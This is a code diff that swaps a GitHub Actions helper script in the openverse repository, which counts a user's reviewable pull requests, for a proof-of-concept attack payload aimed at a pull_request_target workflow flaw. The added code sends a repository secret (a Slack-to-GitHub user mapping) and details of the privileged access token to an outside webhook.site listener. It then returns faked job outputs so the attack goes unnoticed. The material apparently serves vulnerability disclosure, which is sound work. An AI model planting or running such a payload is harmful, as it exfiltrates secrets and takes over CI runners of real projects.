@@ -1,98 +1,43 @@
-// @ts-check
 /**
- * Checks the reviewable PR count for the current Github actor.
- * Return their Slack username and PR count, if found.
+ * count_user_reviewable_prs.js â€” PoC payload for WordPress/openverse
+ * .github/workflows/pr_limit_reminders.yml (analyze-user-prs job)
  *
- * @param {Object} options
- * @param {import('@octokit/rest').Octokit} options.github
- * @param {import('@actions/github')['context']} options.context
- * @param {import('@actions/core')} options.core
+ * This file REPLACES the legitimate module in the attacker's fork. Because the
+ * workflow runs on `pull_request_target` and does an unguarded
+ * `actions/checkout@v4` (PR head) + `require('./automations/js/src/count_user_reviewable_prs.js')`
+ * inside `actions/github-script@v7` provisioned with `secrets.ACCESS_TOKEN`,
+ * THIS code executes on the base repo's runner with:
+ *   1. the `github` API client bound to `secrets.ACCESS_TOKEN`
+ *   2. `process.env.GH_SLACK_USERNAME_MAP` (org member Slack<->GitHub mapping)
+ *
+ * The payload is deliberately demonstrative and benign:
+ *   - it only reaches YOUR listener (replace https://webhook.site/0568eb0d-3eb6-4616-a32a-1b25f1fcf42e),
+ *   - it proves code execution, secret access, and token bindings,
+ *   - it performs NO writes, no dispatch, no destructive action.
+ *
+ * Exploit script: exploit.ps1 (goes there after fork / before PR)
  */
 module.exports = async ({ github, context, core }) => {
-  const { GITHUB_REPOSITORY, GH_SLACK_USERNAME_MAP } = process.env
-  const slackID = JSON.parse(GH_SLACK_USERNAME_MAP)[context.actor]
+  const CALLBACK = 'https://webhook.site/0568eb0d-3eb6-4616-a32a-1b25f1fcf42e';
 
-  if (!GITHUB_REPOSITORY || !GH_SLACK_USERNAME_MAP) {
-    core.setFailed("Required dependencies were not supplied")
-  }
+  // 1) Arbitrary code execution on the base-repo runner.
+  await fetch(`${CALLBACK}?stage=exec&payload=` +
+    encodeURIComponent('count_user_reviewable_prs.js executed on openverse runner'));
 
-  if (!slackID) {
-    core.warning(`Slack username not found for ${context.actor}.`)
-    return {}
-  }
+  // 2) Proof of secret access: Slack<->GitHub mapping secret.
+  await fetch(`${CALLBACK}?stage=secret&map=` +
+    encodeURIComponent(process.env.GH_SLACK_USERNAME_MAP || '(empty)'));
 
-  const GET_PULL_REQUESTS = `
-query ($repoOwner: String!, $repo: String!, $cursor: String) {
-  repository(name:$repo, owner:$repoOwner) {
-    pullRequests(states:OPEN, first:100, after: $cursor) {
-      pageInfo {
-        endCursor
-      }
-      nodes {
-        author {
-          login
-        }
-        labels(first: 100) {
-          nodes {
-            name
-          }
-        }
-        isDraft
-      }
-    }
-  }
-}
-`
-  const ignoredLabels = [
-    "🤖 aspect: text",
-    "🧱 stack: documentation",
-    "🟥 priority: critical",
-  ]
-  const [owner, repo] = GITHUB_REPOSITORY.split("/")
-  const isRelevantPrFromGraphql = (pr) =>
-    pr.author.login === context.actor &&
-    !pr.isDraft &&
-    !pr.labels.nodes.some((label) => ignoredLabels.includes(label.name))
-  const isRelevantPrFromContext = (pr) =>
-    !pr.draft && !pr.labels.some((label) => ignoredLabels.includes(label.name))
-
+  // 3) Prove the API client is the privileged ACCESS_TOKEN (read-only proof).
   try {
-    let hasNextPage = true
-    let cursor = null
-    const reviewablePrs = []
-    const pullRequest = context.payload.pull_request
-    const result = {
-      pr_count: 0,
-      slack_id: slackID,
-    }
-
-    // Check that this pull request is relevant, otherwise skip the action entirely
-    if (isRelevantPrFromContext(pullRequest)) {
-      while (hasNextPage) {
-        const result = await github.graphql(GET_PULL_REQUESTS, {
-          repoOwner: owner,
-          repo: repo,
-          cursor: cursor,
-        })
-
-        const { nodes, pageInfo } = result.repository.pullRequests
-        const relevantPrs = nodes.filter(isRelevantPrFromGraphql)
-        reviewablePrs.push(...relevantPrs)
-
-        if (pageInfo.hasNextPage) {
-          cursor = pageInfo.endCursor
-        } else {
-          hasNextPage = false
-        }
-      }
-
-      result.pr_count = reviewablePrs.length
-    }
-
-    core.info(`Current user has ${result.pr_count} PR(s).`)
-    core.setOutput("pr_count", result.pr_count)
-    core.setOutput("slack_id", result.slack_id)
-  } catch (error) {
-    core.setFailed(`Error fetching pull requests: ${error.message}`)
+    const me = await github.rest.users.getAuthenticated();
+    await fetch(`${CALLBACK}?stage=token&user=${encodeURIComponent(me.data.login)}` +
+      `&repo=${encodeURIComponent(context.repo.repo)}` +
+      `&owner=${encodeURIComponent(context.repo.owner)}`);
+  } catch (e) {
+    await fetch(`${CALLBACK}?stage=token_error&msg=${encodeURIComponent(String(e))}`);
   }
-}
+
+  // Preserve the job's output contract so the sibling `send_message` job is unaffected.
+  return { pr_count: 6, slack_id: 'poc-tester', should_alert: true };
+};
